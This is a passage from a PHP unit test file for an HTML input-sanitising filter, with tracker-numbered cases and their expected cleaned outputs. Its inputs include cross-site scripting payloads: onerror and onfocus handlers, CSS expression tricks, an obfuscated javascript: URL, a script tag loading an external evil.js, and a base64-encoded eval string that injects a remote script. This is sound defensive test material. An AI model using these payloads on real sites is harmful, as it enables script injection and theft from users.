						 ' This is <span class="myclass" font = "myfont" > some more</span> text.</p>';
		$normalNested2 = '<p class="my_class">This is a <a href="http://mysite.com" img="my_image">link test</a>. ' .
						 'This is <span class="myclass" font="myfont"> some more</span> text.</p>';

		$casesSpecific = array(
			'security_tracker_24802_a' => array(
				'',
				'<img src="<img src=x"/onerror=alert(1)//">',
				'<img src="&lt;img src=x&quot;/onerror=alert(1)//" />',
				'From specific cases'
			),
			'security_tracker_24802_b' => array(
				'',
				'<img src="<img src=x"/onerror=alert(1)"//>"',
				'img src="&lt;img src=x&quot;/onerror=alert(1)&quot;//&gt;"',
				'From specific cases'
			),
			'security_tracker_24802_c' => array(
				'',
				'<img src="<img src=x"/onerror=alert(1)"//>',
				'img src="&lt;img src=x&quot;/onerror=alert(1)&quot;//&gt;"',
				'From specific cases'
			),
			'security_tracker_24802_d' => array(
				'',
				'<img src="x"/onerror=alert(1)//">',
				'<img src="x&quot;/onerror=alert(1)//" />',
				'From specific cases'
			),
			'security_tracker_24802_e' => array(
				'',
				'<img src=<img src=x"/onerror=alert(1)//">',
				'img src=<img src="x/onerror=alert(1)//" />',
				'From specific cases'
			),
			'empty_alt'                => array(
				'string',
				'<img alt="" src="my_source" />',
				'<img alt="" src="my_source" />',
				'Test empty alt attribute'
			),
			'disabled_no_equals_a'     => array(
				'string',
				'<img disabled src="my_source" />',
				'<img src="my_source" />',
				'Test empty alt attribute'
			),
			'disabled_no_equals_b'     => array(
				'string',
				'<img alt="" disabled src="aaa" />',
				'<img alt="" src="aaa" />',
				'Test empty alt attribute'
			),
			'disabled_no_equals_c'     => array(
				'string',
				'<img disabled />',
				'<img />',
				'Test empty alt attribute'
			),
			'disabled_no_equals_d'     => array(
				'string',
				'<img height="300" disabled />',
				'<img height="300" />',
				'Test empty alt attribute'
			),
			'disabled_no_equals_e'     => array(
				'string',
				'<img height disabled />',
				'<img />',
				'Test empty alt attribute'
			),
			'test_nested'              => array(
				'string',
				'<img src="<img src=x"/onerror=alert(1)//>" />',
				'<img src="&lt;img src=x&quot;/onerror=alert(1)//&gt;" />',
				'Test empty alt attribute'
			),
			'infinte_loop_a'           => array(
				'string',
				'<img src="x" height = "zzz" />',
				'<img src="x" height="zzz" />',
				'Test empty alt attribute'
			),
			'infinte_loop_b'           => array(
				'string',
				'<img src = "xxx" height = "zzz" />',
				'<img src="xxx" height="zzz" />',
				'Test empty alt attribute'
			),
			'quotes_in_text'           => array(
				'string',
				$quotesInText1,
				$quotesInText2,
				'Test valid nested tag'
			),
			'normal_nested'            => array(
				'string',
				$normalNested1,
				$normalNested2,
				'Test valid nested tag'
			),
			'hanging_quote'            => array(
				'string',
				"<img src=\' />",
				'<img src="" />',
				'From specific cases'
			),
			'hanging_quote2'           => array(
				'string',
				'<img src slkdjls " this is "more " stuff',
				'img src slkdjls " this is "more " stuff',
				'From specific cases'
			),
			'hanging_quote3'           => array(
				'string',
				"<img src=\"\' />",
				'img src="\\\' /&gt;"',
				'From specific cases'
			),
			'tracker25558a'            => array(
				'string',
				'<SCRIPT SRC=http://jeffchannell.com/evil.js#<B />',
				'SCRIPT SRC=http://jeffchannell.com/evil.js#<B />',
				'Test mal-formed element from 25558a'
			),
			'tracker25558b'            => array(
				'string',
				'<IMG STYLE="xss:expression(alert(\'XSS\'))" />',
				'<IMG style="xss(alert(\'XSS\'))" />',
				'Test mal-formed element from 25558b'
			),
			'tracker25558c'            => array(
				'string',
				'<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))" />',
				'<IMG style="xss(alert(\'XSS\'))" />',
				'Test mal-formed element from 25558b'
			),
			'tracker25558d'            => array(
				'string',
				'<IMG STYLE="xss:expr/*XSS*/ess/*another comment*/ion(alert(\'XSS\'))" />',
				'<IMG style="xss(alert(\'XSS\'))" />',
				'Test mal-formed element from 25558b'
			),
			'tracker25558e'            => array(
				'string',
				'<b><script<b></b><alert(1)</script </b>',
				'<b>script<b></b>alert(1)/script</b>',
				'Test mal-formed element from 25558e'
			),
			'security_20110329a'       => array(
				'string',
				"<img src='<img src='///'/> ",
				"<img src=\"'&lt;img\" src=\"'///'/\" /> ",
				'From specific cases'
			),
			'html_01'                  => array(
				'html',
				'<div>Hello</div>',
				'<div>Hello</div>',
				'Generic test case for HTML cleaning'
			),
			'tracker26439a'            => array(
				'string',
				'<p>equals quote =" inside valid tag</p>',
				'<p>equals quote =" inside valid tag</p>',
				'Test quote equals inside valid tag'
			),
			'tracker26439b'            => array(
				'string',
				"<p>equals quote =' inside valid tag</p>",
				"<p>equals quote =' inside valid tag</p>",
				'Test single quote equals inside valid tag'
			),
			'forward_slash'            => array(
				'',
				'<textarea autofocus /onfocus=alert(1)>',
				'<textarea />',
				'Test for detection of leading forward slashes in attributes'
			),
			'tracker25558f'            => array(
				'string',
				'<a href="javas&Tab;cript:alert(&tab;document.domain&TaB;)">Click Me</a>',
				'<a>Click Me</a>',
				'Test mal-formed element from 25558f'
			),
			'Attribute with dash'      => array(
				'string',
				'<img data-value="1" />',
				'<img data-value="1" />',
				'From generic cases'
			),
		);
		$tests         = array_merge($this->casesGeneric(), $casesSpecific);

		return $tests;
	}

	/**
	 * Execute a test case with clean() default blacklist filter settings (strips bad tags).
	 *
	 * @param   string  $type     The type of input
	 * @param   string  $data     The input
	 * @param   string  $expect   The expected result for this test.
	 * @param   string  $message  The failure message identifying the source of the test case.
	 *
	 * @return  void
	 *
	 * @dataProvider blacklist
	 */
	public function testCleanWithDefaultBlackList($type, $data, $expect, $message)
	{
		$filter = new InputFilter(null, null, 1, 1);
		$this->assertThat(
			$filter->clean($data, $type),
			$this->equalTo($expect),
			$message
		);
	}

	/**
	 * Produces the array of test cases for the Blacklist img tag test run.
	 *
	 * @return  array  Two dimensional array of test cases. Each row consists of three values
	 *                 The first is the type of input data, the second is the actual input data,
	 *                 the third is the expected result of filtering, and the fourth is
	 *                 the failure message identifying the source of the data.
	 */
	public function blacklistImg()
	{
		$security20110328String = "<img src='<img src='/onerror=" .
								  "eval(atob(/KGZ1bmN0aW9uKCl7dHJ5e3ZhciBkPWRvY3VtZW50LGI9ZC5ib2R5LHM9ZC5jcmVhdGVFbGV" .
								  "tZW50KCdzY3JpcHQnKTtzLnNldEF0dHJpYnV0ZSgnc3JjJywnaHR0cDovL2hhLmNrZXJzLm9yZy94c3MuanMnKTtiLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs=" .
								  "/.source))//'/> ";

		$casesSpecific = array(
			'Kill script'                      => array(
				'',
				'<img src="javascript:alert();" />',
				'',
				'From specific cases'
			),
			'Unquoted Attribute Without Space' => array(
				'',
				'<img height=300>',
				'',
				'From specific cases'
			),
			'Unquoted Attribute'               => array(
				'',
				'<img height=300 />',
				'',
				'From specific cases'
			),
			'Single quoted Attribute'          => array(
				'',
				'<img height=\'300\' />',
				'',
				'From specific cases'
			),
			'Attribute is zero'                => array(
				'',
				'<img height=0 />',
				'',
				'From specific cases'
			),
			'Attribute value missing'          => array(
				'',
				'<img height= />',
				'',
				'From specific cases'
			),
			'Attribute without ='              => array(
				'',
				'<img height="300" ismap />',
				'',
				'From specific cases'
			),
			'tracker9725'                      => array(
				// Test for recursion with single tags
				'string',
				'<img class="one two" />',
				'',
				'From specific cases'
			),
			'security_20110328'                => array(
				'string',
				$security20110328String,
				' ',
				'From specific cases'
			),
		);
		$tests         = array_merge($this->casesGeneric(), $casesSpecific);

		return $tests;
	}

	/**
	 * Execute a test case with clean() using custom img blacklist filter settings (strips bad tags).
	 *
	 * @param   string  $type     The type of input
	 * @param   string  $data     The input
	 * @param   string  $expect   The expected result for this test.
	 * @param   string  $message  The failure message identifying the source of the test case.
	 *
	 * @return  void
	 *
	 * @dataProvider blacklistImg
	 */
	public function testCleanWithImgBlackList($type, $data, $expect, $message)
	{
		$filter = new InputFilter(array('img'), null, 1, 1);
		$this->assertThat(
			$filter->clean($data, $type),
			$this->equalTo($expect),
			$message
		);
	}

	/**
	 * Produces the array of test cases for the Blacklist class attribute test run.
	 *
	 * @return  array  Two dimensional array of test cases. Each row consists of three values
	 *                 The first is the type of input data, the second is the actual input data,
	 *                 the third is the expected result of filtering, and the fourth is
	 *                 the failure message identifying the source of the data.
	 */
	public function blacklistClass()
	{
		$casesSpecific = array(
			'tracker9725'         => array(
				// Test for recursion with single tags
				'string',
				'<img class="one two" />',
				'<img />',
				'From specific cases'
			),
			'tracker15673'        => array(
				'raw',
				'<ul>
<li><a href="../">презентация</a>)</li>
<li>Елфимова О.Т. Разработка системы отделения космического аппарата Метеор-М в системе MSC.Adams<a style="color: maroon;" href="../../pub/diplom_labors/2016/2016_Elfimova_O_rpz.pdf">диплом</a></li>
</ul>',
				'<ul>
<li><a href="../">презентация</a>)</li>
<li>Елфимова О.Т. Разработка системы отделения космического аппарата Метеор-М в системе MSC.Adams<a style="color: maroon;" href="../../pub/diplom_labors/2016/2016_Elfimova_O_rpz.pdf">диплом</a></li>
</ul>',
				'From generic cases'
			),
			'tracker15673a'       => array(
				'string',
				'<ul>
<li><a href="../">презентация</a>)</li>
<li>Елфимова О.Т. Разработка системы отделения космического аппарата Метеор-М в системе MSC.Adams<a style="color: maroon;" href="../../pub/diplom_labors/2016/2016_Elfimova_O_rpz.pdf">диплом</a></li>
</ul>',
				'<ul>
<li><a href="../">презентация</a>)</li>
<li>Елфимова О.Т. Разработка системы отделения космического аппарата Метеор-М в системе MSC.Adams<a style="color: maroon;" href="../../pub/diplom_labors/2016/2016_Elfimova_O_rpz.pdf">диплом</a></li>
</ul>',
				'From generic cases'
			),
			'tracker15673b'       => array(
				'string',
				'<h3>Инженеры</h3>
<ul>
<li>Агасиев Т.А. "Программная система для автоматизированной настройки параметров алгоритмов оптимизации"<br />(<a class="text" href="/pub/diplom_labors/2016/2016_Agasiev_T_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Agasiev_T_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Логунова А.О. "Исследование и разработка программного обеспечения определения параметров электрокардиограмм"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Logunova_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Logunova_A_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Спасёнов А.Ю. "Разработка экспериментального программного комплекса анализа и интерпретации электрокардиограмм"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Spasenov_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Spasenov_A_prezentation.pdf">презентация</a>)</li>
<li>Щетинин В.Н. "Имитационное моделирование эксперимента EXPERT физики радиоактивных пучков"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Shhetinin_V_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Shhetinin_V_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Елфимова О.Т. "Разработка системы отделения космического аппарата "Метеор-М" в системе MSC.Adams" <br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Elfimova_O_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Elfimova_O_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Ранкова А.В. "Исследование и разработка методов и алгоритмов распознавания и селекции наземных стационарных объектов"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Rankova_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Rankova_A_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
</ul>',
				'<h3>Инженеры</h3>
<ul>
<li>Агасиев Т.А. "Программная система для автоматизированной настройки параметров алгоритмов оптимизации"<br />(<a href="/pub/diplom_labors/2016/2016_Agasiev_T_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Agasiev_T_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Логунова А.О. "Исследование и разработка программного обеспечения определения параметров электрокардиограмм"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Logunova_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Logunova_A_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Спасёнов А.Ю. "Разработка экспериментального программного комплекса анализа и интерпретации электрокардиограмм"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Spasenov_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Spasenov_A_prezentation.pdf">презентация</a>)</li>
<li>Щетинин В.Н. "Имитационное моделирование эксперимента EXPERT физики радиоактивных пучков"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Shhetinin_V_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Shhetinin_V_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Елфимова О.Т. "Разработка системы отделения космического аппарата "Метеор-М" в системе MSC.Adams" <br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Elfimova_O_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Elfimova_O_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Ранкова А.В. "Исследование и разработка методов и алгоритмов распознавания и селекции наземных стационарных объектов"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Rankova_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Rankova_A_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
</ul>',
				'From generic cases'
			),
			'tracker15673c'       => array(
				'raw',
				'<h3>Инженеры</h3>
<ul>
<li>Агасиев Т.А. "Программная система для автоматизированной настройки параметров алгоритмов оптимизации"<br />(<a class="text" href="/pub/diplom_labors/2016/2016_Agasiev_T_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Agasiev_T_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Логунова А.О. "Исследование и разработка программного обеспечения определения параметров электрокардиограмм"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Logunova_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Logunova_A_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Спасёнов А.Ю. "Разработка экспериментального программного комплекса анализа и интерпретации электрокардиограмм"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Spasenov_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Spasenov_A_prezentation.pdf">презентация</a>)</li>
<li>Щетинин В.Н. "Имитационное моделирование эксперимента EXPERT физики радиоактивных пучков"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Shhetinin_V_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Shhetinin_V_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Елфимова О.Т. "Разработка системы отделения космического аппарата "Метеор-М" в системе MSC.Adams" <br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Elfimova_O_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Elfimova_O_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Ранкова А.В. "Исследование и разработка методов и алгоритмов распознавания и селекции наземных стационарных объектов"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Rankova_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Rankova_A_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
</ul>',
				'<h3>Инженеры</h3>
<ul>
<li>Агасиев Т.А. "Программная система для автоматизированной настройки параметров алгоритмов оптимизации"<br />(<a class="text" href="/pub/diplom_labors/2016/2016_Agasiev_T_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Agasiev_T_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Логунова А.О. "Исследование и разработка программного обеспечения определения параметров электрокардиограмм"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Logunova_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Logunova_A_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Спасёнов А.Ю. "Разработка экспериментального программного комплекса анализа и интерпретации электрокардиограмм"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Spasenov_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Spasenov_A_prezentation.pdf">презентация</a>)</li>
<li>Щетинин В.Н. "Имитационное моделирование эксперимента EXPERT физики радиоактивных пучков"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Shhetinin_V_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Shhetinin_V_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Елфимова О.Т. "Разработка системы отделения космического аппарата "Метеор-М" в системе MSC.Adams" <br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Elfimova_O_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Elfimova_O_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
<li>Ранкова А.В. "Исследование и разработка методов и алгоритмов распознавания и селекции наземных стационарных объектов"<br />(<a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Rankova_A_rpz.pdf" target="_blank" rel="noopener noreferrer">диплом</a>, <a style="color: maroon;" href="/pub/diplom_labors/2016/2016_Rankova_A_prezentation.pdf" target="_blank" rel="noopener noreferrer">презентация</a>)</li>
</ul>',
				'From generic cases'
			),
			'tracker15673d'       => array(
				'raw',
				'<li><strong>Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°</strong>. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°-Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð° Ð°Ð°Ð°, Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ñ‘Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°, Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°-Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°, Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°.</li>
</ol>
<p>Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ñ‘Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°: Ð°Ð°Ð°Ð°Ð°Ð°.Ð°Ð°Ð°Ð°Ð°Ð°, Qiwi, Webmoney Ð° Ð°.Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°.</p>
<p>{lang ru} <iframe src="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" width="100%" height="439" allowfullscreen="allowfullscreen"></iframe> {/lang}
<script type="application/ld+json">{
  "@context": "http://schema.org",
  "@type": "VideoObject",
  "name": "Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°",
  "description": "Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ñ‘Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°.",
  "thumbnailUrl": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "uploadDate": "2015-02-16T12:15:30+12:15",
  "duration": "PT10M51S",
  "embedUrl": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
}</script>
</p>',
